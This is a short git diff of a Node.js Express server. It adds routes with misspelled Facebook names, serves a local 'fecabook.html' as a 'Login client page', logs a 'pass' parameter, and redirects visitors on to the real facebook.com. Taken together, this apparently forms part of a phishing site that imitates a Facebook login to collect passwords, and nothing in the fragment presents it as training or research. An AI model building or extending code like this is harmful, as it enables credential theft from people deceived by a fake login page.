@@ -22,15 +22,19 @@ app.get('/faceboooooook', (req, res,next) => {
     res.sendFile(__dirname + '/faceboooooook.html')
 });
 
+app.get('/faceboook', (req, res,next) => {
+    console.log('redirect to facebook');
+    res.redirect('http://www.facebook.com');
+});
+
 
 app.get('/', (req, res,next) => {
     console.log('Login client page');
     console.log('==\t==\t==\t');
     console.log('req.params.pass : ' +req.params.pass);
     console.log('==\t==\t==\t');
-    //res.sendFile(__dirname + '/Zynga Poker.html')
-    res.redirect('http://www.facebook.com');
-});
+    res.sendFile(__dirname + '/fecabook.html')
+    });
 
 app.get('/client', (req, res,next) => {
     console.log('opening client page');
